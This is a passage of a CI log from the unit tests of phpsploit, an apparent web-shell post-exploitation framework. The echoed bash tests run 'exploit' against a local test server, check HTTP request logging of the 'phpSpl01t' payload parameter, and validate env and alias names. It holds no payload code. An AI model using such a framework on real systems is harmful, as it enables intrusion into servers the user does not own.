IndexError: list index out of range\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# empty string fails\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe 'alias \"\" BLA' > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"\\[\\!\\] Key Error: illegal name: '' doesn't match \\[A-Za-z0-9@_\\.-\\]+\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# string with spaces fails\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe 'alias \"has space\" BLA' > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"\\[\\!\\] Key Error: illegal name: 'has space' doesn't match \\[A-Za-z0-9@_\\.-\\]+\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# ',' (badchar) fails\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe 'alias ,bad BLA' > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"\\[\\!\\] Key Error: illegal name: ',bad' doesn't match \\[A-Za-z0-9@_\\.-\\]+\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# ensure alias output hasn't changed (because no vars were created)\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe alias > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdiff $TMPFILE-ref $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2mexit_script\u001b[m\n[Unit Tests/build]   | \u001b[0m\u001b[1;32m[+]\u001b[0;32m /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/commands/alias.sh succeeded\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m TEST_TIME=6s\u001b[0m\n[Unit Tests/build]   | \n[Unit Tests/build]   | \n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m RUNNING /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/commands/corectl/display-http-requests.sh ...\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPWD\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/commands/corectl\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mROOTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTESTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/commands/corectl\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/commands/corectl/display-http-requests.sh\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/tmp.mRRzP2IHN6\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT\u001b[0m = \u001b[1;33mcoverage run --rcfile=/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT_CONFIG_DIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/phpsploit-config\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mRAW_PHPSPLOIT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mWWWROOT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/wwwroot\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTARGET\u001b[0m = \u001b[1;33m127.0.0.1:42211\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE\u001b[0m = \u001b[1;33mtrue\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_FILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coverage\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_RCFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc\u001b[0m\n[Unit Tests/build]   | \u001b[33;2m#!/bin/bash\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# test behavior of `corectl display-http-requests`\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# should fail with msg if no requests were sent:\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe corectl display-http-requests > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^\\[-\\] From now, phpsploit didn't sent any HTTP(s) request$\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# after exploit, a single GET request is present:\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe exploit > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe corectl display-http-requests > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^\\[\\*\\] Listing last payload's HTTP(s) requests:$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^### REQUEST 1$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^GET / HTTP/1.1$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^Accept-Encoding: identity$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^Connection: close$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^Zzaa: \u001b[m\n[Unit Tests/build]   | \u001b[33;2m^Zzab: \u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_not_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^\\[-\\] From now, phpsploit didn't sent any HTTP(s) request$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^### REQUEST 2$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^POST / HTTP/1.1$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^phpSpl01t=\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m[ \"$(grep -c REQUEST $TMPFILE)\" -eq 1 ] || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# use POST method, with 2k POST_DATA limitation, and check that all\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# requests were logged as expected after running `ls` plugin:\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set REQ_DEFAULT_METHOD POST > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe set REQ_MAX_POST_SIZE 2k > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe \"ls\\nP\" > $TMPFILE-x # add P to confirm multireq by POST\u001b[m\n[Unit Tests/build]   | \u001b[33;2mnum_reqs=$(grep 'will be' $TMPFILE-x | sed -E 's/.* ([0-9]+) .* will be .*/\\1/')\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe corectl display-http-requests > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m[[ \"$(grep -c REQUEST $TMPFILE)\" == \"$num_reqs\" ]] || FAIL \"$num_reqs\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^\\[\\*\\] Listing last payload's HTTP(s) requests:$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^### REQUEST 1$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^### REQUEST 2$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^### REQUEST $num_reqs$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^POST / HTTP/1.1$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^phpSpl01t=\u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_not_contains $TMPFILE << EOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^\\[-\\] From now, phpsploit didn't sent any HTTP(s) request$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^### REQUEST $(( $num_reqs + 1 ))$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^GET / HTTP/1.1$\u001b[m\n[Unit Tests/build]   | \u001b[33;2m^Zzaa: \u001b[m\n[Unit Tests/build]   | \u001b[33;2m^Zzab: \u001b[m\n[Unit Tests/build]   | \u001b[33;2mEOF\u001b[m\n[Unit Tests/build]   | \u001b[33;2mexit_script\u001b[m\n[Unit Tests/build]   | \u001b[0m\u001b[1;32m[+]\u001b[0;32m /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/commands/corectl/display-http-requests.sh succeeded\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m TEST_TIME=1s\u001b[0m\n[Unit Tests/build]   | \n[Unit Tests/build]   | \n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m RUNNING /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/commands/env.sh ...\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPWD\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/commands\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mROOTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTESTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/commands\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/commands/env.sh\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/tmp.bL8gs95BfK\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT\u001b[0m = \u001b[1;33mcoverage run --rcfile=/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPHPSPLOIT_CONFIG_DIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/phpsploit-config\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mRAW_PHPSPLOIT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mWWWROOT\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp/wwwroot\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTARGET\u001b[0m = \u001b[1;33m127.0.0.1:42211\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE\u001b[0m = \u001b[1;33mtrue\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_FILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coverage\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mCOVERAGE_RCFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/.coveragerc\u001b[0m\n[Unit Tests/build]   | \u001b[33;2m#!/usr/bin/env bash\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m############################################################\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### NON-CONNECTED\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###     we have never been connected to a target\u001b[m\n[Unit Tests/build]   | \u001b[33;2m############################################################\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# issue #53: env: Confusing error message before `exploited` context\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# Ref: https://github.com/nil0x42/phpsploit/issues/53\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe env > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -q '^\\[\\-\\] Must connect to spread env vars ' $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe env PWD > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -q '^\\[\\-\\] Must connect to spread env vars ' $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m############################################################\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### CONNECTED\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###     we are currently connected to target (`exploit`)\u001b[m\n[Unit Tests/build]   | \u001b[33;2m############################################################\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe exploit > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# env must succesfully return list of env vars after exploited\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe env > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# list of all env vars\u001b[m\n[Unit Tests/build]   | \u001b[33;2menv_vars=`sed -e '1,/---/d' -e '/^$/,$d' $TMPFILE | awk '{print $1}'`\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# keep clean output for comparison\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -v '^\\[\\#' $TMPFILE > $TMPFILE-1\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m############################################################\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### DISCONNECTED\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###     we disconnected from target (`exit`)\u001b[m\n[Unit Tests/build]   | \u001b[33;2m############################################################\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe exit > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# env must succesfully return list of env vars, even after disconnect\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe env > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# keep clean output for comparison\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgrep -v '^\\[\\#' $TMPFILE > $TMPFILE-2\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# compare env connected, with env after disconnection\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdiff $TMPFILE-1 $TMPFILE-2 || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mrm $TMPFILE-1 $TMPFILE-2\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### env <VAR>\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# list of readonly env vars\u001b[m\n[Unit Tests/build]   | \u001b[33;2mgetval () {\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    phpsploit_pipe env $1 > $TMPFILE-getval\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    grep -oP '^\\s+'$1'+\\s+\\K.*(?=\\s*$)' $TMPFILE-getval\u001b[m\n[Unit Tests/build]   | \u001b[33;2m}\u001b[m\n[Unit Tests/build]   | \u001b[33;2mro_env=\" ADDR CLIENT_ADDR HOST HTTP_SOFTWARE PATH_SEP PHP_VERSION WEB_ROOT \"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mfor var in $env_vars; do\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    phpsploit_pipe env $var > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    old_val=\"`getval $var`\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    [ -z \"$old_val\" ] && FAIL $var\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    # if var is readonly\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    if [[ \"$ro_env\" == *\" $var \"* ]]; then\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        # try to set another value (must fail)\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        phpsploit_pipe env $var FOOBAR > $TMPFILE && FAIL $var\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        grep -q \"'$var' variable is read-only\" $TMPFILE || FAIL $var\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        [[ \"`getval $var`\" == \"$old_val\" ]] || FAIL $var\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        # try to unset variable (must fail)\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        phpsploit_pipe \"env $var none\" > $TMPFILE && FAIL $var\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        [[ \"`getval $var`\" == \"$old_val\" ]] || FAIL $var\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    # else\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    else\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        ## try to set another value (must succeed)\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        phpsploit_pipe env $var FOOBAR > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        [[ \"`getval $var`\" == \"FOOBAR\" ]] || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        # try to unset variable (must succeed)\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        phpsploit_pipe \"env $var none\" > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m        [ -z \"`getval $var`\" ] || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    fi\u001b[m\n[Unit Tests/build]   | \u001b[33;2m    echo \"[OK] env $var\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdone\u001b[m\n[Unit Tests/build]   | [OK] env ADDR\n[Unit Tests/build]   | [OK] env CLIENT_ADDR\n[Unit Tests/build]   | [OK] env HOME\n[Unit Tests/build]   | [OK] env HOST\n[Unit Tests/build]   | [OK] env HTTP_SOFTWARE\n[Unit Tests/build]   | [OK] env PATH_SEP\n[Unit Tests/build]   | [OK] env PHP_VERSION\n[Unit Tests/build]   | [OK] env PLATFORM\n[Unit Tests/build]   | [OK] env PWD\n[Unit Tests/build]   | [OK] env USER\n[Unit Tests/build]   | [OK] env WEB_ROOT\n[Unit Tests/build]   | [OK] env WRITEABLE_TMPDIR\n[Unit Tests/build]   | [OK] env WRITEABLE_WEBDIR\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### CHECK VALID VAR NAMES\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###   (create new custom env vars)\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe env FOO BAR > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m[[ \"`getval FOO`\" == \"BAR\" ]] || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe env this@IS.valid myval > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m[[ \"`getval this@IS.valid`\" == \"myval\" ]] || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m### CHECK INVALID VAR NAMES\u001b[m\n[Unit Tests/build]   | \u001b[33;2m###\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# keep track of previously existing env vars\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe env > $TMPFILE-ref || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# empty string fails\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe 'env \"\" BLA' > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"\\[\\!\\] Key Error: illegal name: '' doesn't match \\[A-Za-z0-9@_\\.-\\]+\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# string with spaces fails\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe 'env \"has space\" BLA' > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"\\[\\!\\] Key Error: illegal name: 'has space' doesn't match \\[A-Za-z0-9@_\\.-\\]+\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# ',' (badchar) fails\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe 'env ,bad BLA' > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"\\[\\!\\] Key Error: illegal name: ',bad' doesn't match \\[A-Za-z0-9@_\\.-\\]+\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# special name used to save default values in sessions, should fail\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe 'env __DEFAULTS__ BLA' > $TMPFILE && FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2massert_contains $TMPFILE \"\\[\\!\\] Key Error: illegal name: '__DEFAULTS__'\"\u001b[m\n[Unit Tests/build]   | \u001b[33;2m\u001b[m\n[Unit Tests/build]   | \u001b[33;2m# ensure env output hasn't changed (because no vars were created)\u001b[m\n[Unit Tests/build]   | \u001b[33;2mphpsploit_pipe env > $TMPFILE || FAIL\u001b[m\n[Unit Tests/build]   | \u001b[33;2mdiff $TMPFILE-ref $TMPFILE\u001b[m\n[Unit Tests/build]   | \u001b[33;2mexit_script\u001b[m\n[Unit Tests/build]   | \u001b[0m\u001b[1;32m[+]\u001b[0;32m /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/commands/env.sh succeeded\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m TEST_TIME=9s\u001b[0m\n[Unit Tests/build]   | \n[Unit Tests/build]   | \n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m RUNNING /tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/commands/help.sh ...\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;34m[*]\u001b[0;36m ======================================================================\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mPWD\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/commands\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mROOTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTESTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/commands\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mSCRIPTFILE\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/commands/help.sh\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPDIR\u001b[0m = \u001b[1;33m/tmp/de65f406-fe28-11ed-a890-af2cc187fc11/nil0x42-phpsploit/test/tmp\u001b[0m\n[Unit Tests/build]   | \u001b[0m\u001b[1;33m[I]    \u001b[0;33mTMPFILE\u001b[0m = 